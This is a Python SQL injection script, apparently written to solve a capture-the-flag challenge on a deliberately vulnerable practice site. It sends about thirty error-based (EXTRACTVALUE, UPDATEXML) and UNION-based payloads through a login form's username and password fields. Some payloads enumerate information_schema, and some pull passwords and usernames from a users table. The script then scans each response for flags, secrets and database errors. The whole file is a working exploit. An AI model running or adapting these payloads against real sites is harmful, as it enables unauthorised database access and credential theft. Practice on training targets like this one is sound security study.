#!/usr/bin/env python3
import requests
import time
import re
import base64

# URL del target
url = "http://hackme1.vulnmachines.com/sqli/Error-based/Post-error-based-single.php"

def search_in_response(payload, param="uname"):
    try:
        data = {
            "uname": payload if param == "uname" else "admin",
            "passwd": payload if param == "passwd" else "admin", 
            "login": "login"
        }
        
        print(f"\n[SEARCHING] {param}: {payload}")
        response = requests.post(url, data=data, timeout=5)
        content = response.text
        
        # Buscar flags con patrones más amplios
        flag_patterns = [
            r'vnm\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'VNM\{[^}]+\}',
            r'[a-zA-Z0-9_]{20,}',
            r'[a-f0-9]{32,}',
            r'[a-f0-9]{40,}',
            r'[A-Za-z0-9+/]{20,}={0,2}',  # Base64
        ]
        
        found_flags = []
        for pattern in flag_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                found_flags.extend(matches)
                print(f"[PATTERN] {pattern}: {matches}")
        
        # Buscar en comentarios HTML
        html_comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL)
        for comment in html_comments:
            if any(keyword in comment.lower() for keyword in ['flag', 'vnm', 'secret', 'password']):
                print(f"[HTML COMMENT] {comment}")
        
        # Buscar en atributos HTML
        attributes = re.findall(r'(\w+)="([^"]*)"', content)
        for attr, value in attributes:
            if any(keyword in value.lower() for keyword in ['flag', 'vnm', 'secret', 'password']):
                print(f"[HTML ATTRIBUTE] {attr}='{value}'")
        
        # Buscar en JavaScript
        js_matches = re.findall(r'<script[^>]*>(.*?)</script>', content, re.DOTALL | re.IGNORECASE)
        for js in js_matches:
            if any(keyword in js.lower() for keyword in ['flag', 'vnm', 'secret', 'password']):
                print(f"[JAVASCRIPT] {js[:200]}...")
        
        # Buscar en texto oculto
        hidden_text = re.findall(r'<[^>]*style="[^"]*display:\s*none[^"]*"[^>]*>(.*?)</[^>]*>', content, re.DOTALL | re.IGNORECASE)
        for hidden in hidden_text:
            if any(keyword in hidden.lower() for keyword in ['flag', 'vnm', 'secret', 'password']):
                print(f"[HIDDEN TEXT] {hidden}")
        
        # Buscar diferencias en la respuesta
        if len(content) != 5238:
            print(f"[LENGTH DIFFERENCE] {len(content)} (expected 5238)")
            # Guardar respuesta diferente
            with open(f"different_response_{param}_{hash(payload) % 10000}.html", 'w') as f:
                f.write(content)
            print(f"[SAVED] Different response saved")
        
        # Buscar errores de base de datos específicos
        error_patterns = [
            r'MySQL error.*?(\d+)',
            r'SQL error.*?(\d+)',
            r'Database error.*?(\d+)',
            r'Warning.*?mysql',
            r'Fatal error.*?mysql',
        ]
        
        for pattern in error_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"[ERROR] {pattern}: {matches}")
        
        return found_flags
        
    except Exception as e:
        print(f"[ERROR] {e}")
        return []

def main():
    print("=== Detailed Flag Search ===")
    print(f"Target: {url}")
    print("=" * 50)
    
    # Payloads específicos para error-based SQL injection
    error_payloads = [
        # Error-based extraction
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "admin' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns LIMIT 1), 0x7e)) --",
        
        # Buscar flags específicamente
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT flag FROM flag LIMIT 1), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT value FROM flag LIMIT 1), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT data FROM data LIMIT 1), 0x7e)) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret FROM secret LIMIT 1), 0x7e)) --",
        
        # Union queries con diferentes números de columnas
        "admin' UNION SELECT 1 --",
        "admin' UNION SELECT 1,2 --",
        "admin' UNION SELECT 1,2,3 --",
        "admin' UNION SELECT 1,2,3,4 --",
        "admin' UNION SELECT 1,2,3,4,5 --",
        "admin' UNION SELECT 1,2,3,4,5,6 --",
        "admin' UNION SELECT 1,2,3,4,5,6,7 --",
        "admin' UNION SELECT 1,2,3,4,5,6,7,8 --",
        
        # Información específica
        "admin' UNION SELECT version(),2,3,4,5 --",
        "admin' UNION SELECT user(),2,3,4,5 --",
        "admin' UNION SELECT database(),2,3,4,5 --",
        "admin' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables --",
        "admin' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns --",
        
        # Buscar en tablas específicas
        "admin' UNION SELECT flag,2,3,4,5 FROM flag --",
        "admin' UNION SELECT value,2,3,4,5 FROM flag --",
        "admin' UNION SELECT data,2,3,4,5 FROM data --",
        "admin' UNION SELECT secret,2,3,4,5 FROM secret --",
        "admin' UNION SELECT password,2,3,4,5 FROM users --",
        "admin' UNION SELECT username,2,3,4,5 FROM users --",
    ]
    
    all_flags = []
    
    # Probar payloads en uname
    print("\n[TESTING UNAME PARAMETER]")
    for payload in error_payloads:
        flags = search_in_response(payload, "uname")
        all_flags.extend(flags)
        time.sleep(0.5)
    
    # Probar payloads en passwd
    print("\n[TESTING PASSWD PARAMETER]")
    for payload in error_payloads:
        flags = search_in_response(payload, "passwd")
        all_flags.extend(flags)
        time.sleep(0.5)
    
    # Resumen
    if all_flags:
        print(f"\n[SUMMARY] Flags found: {set(all_flags)}")
    else:
        print("\n[SUMMARY] No flags found in detailed search")

if __name__ == "__main__":
    main()